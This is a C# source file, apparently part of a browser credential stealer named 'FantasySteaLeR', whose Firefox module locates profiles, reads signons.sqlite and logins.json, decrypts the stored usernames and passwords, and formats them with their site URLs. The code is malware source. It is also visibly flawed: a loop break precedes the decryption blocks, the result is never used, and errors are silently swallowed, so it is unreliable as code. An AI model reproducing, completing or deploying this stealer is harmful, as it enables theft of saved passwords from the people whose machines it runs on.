using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using FantasySteaLeR;
using Newtonsoft.Json;

internal class Firefox
{
    private static readonly string RoamingAppDataFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    private const string SQLiteConnectionString = "Data Source=\"{0}\";Version=3;FailIfMissing=True";
    public static void GetLoginsFirefox()
    {
        try
        {
            string str = string.Empty;
            string str2 = null;
            string path = null;
            bool flag = false;
            bool flag2 = false;
            string[] directories = Directory.GetDirectories(Path.Combine(RoamingAppDataFolder, @"Mozilla\Firefox\Profiles"));
            if (directories.Length != 0)
            {
                string str6;
                string str7;
                string str10;
                foreach (string str4 in directories)
                {
                    string[] files = Directory.GetFiles(str4, "signons.sqlite");
                    if (files.Length > 0)
                    {
                        str2 = files[0];
                        flag = true;
                    }
                    files = Directory.GetFiles(str4, "logins.json");
                    if (files.Length > 0)
                    {
                        path = files[0];
                        flag2 = true;
                    }
                    if (flag2 || flag)
                    {
                        CryptoAPI.FFDecryptor.Init(str4);
                        break;
                    }
                    if (flag)
                    {
                        using (SQLiteConnection connection = new SQLiteConnection(string.Format("Data Source=\"{0}\";Version=3;FailIfMissing=True", str2)))
                        {
                            connection.Open();
                            SQLiteCommand command = connection.CreateCommand();
                            command.CommandText = "SELECT encryptedUsername, encryptedPassword, hostname FROM moz_logins";
                            using (SQLiteBase.DataReader reader = command.ExecuteReader())
                            {
                                while (reader.Read())
                                {
                                    str6 = CryptoAPI.FFDecryptor.Decrypt(reader.GetString(0));
                                    str7 = CryptoAPI.FFDecryptor.Decrypt(reader.GetString(1));
                                    str10 = str;
                                    str = str10 + "-===============[Mozilla Firefox]===============-" + Environment.NewLine + "Link: " + reader.GetString(2) + Environment.NewLine + "Username: " + str6 + Environment.NewLine + "Password: " + str7 + Environment.NewLine + "Browser: Mozilla Firefox" + Environment.NewLine;
                                }
                            }
                            command.Dispose();
                        }
                    }
                    if (flag2)
                    {
                        FFLogins logins;
                        using (StreamReader reader2 = new StreamReader(path))
                        {
                            logins = JsonConvert.DeserializeObject<FFLogins>(reader2.ReadToEnd());
                        }
                        foreach (LoginData data in logins.logins)
                        {
                            str6 = CryptoAPI.FFDecryptor.Decrypt(data.encryptedUsername);
                            str7 = CryptoAPI.FFDecryptor.Decrypt(data.encryptedPassword);
                            str10 = str;
                            str = str10 + "-===============[Mozilla Firefox]===============-" + Environment.NewLine + "Link: " + data.hostname + Environment.NewLine + "Username: " + str6 + Environment.NewLine + "Password: " + str7 + Environment.NewLine + "Browser: Mozilla Firefox" + Environment.NewLine;
                        }
                    }
                }
            }
        }
        catch { }
    }
}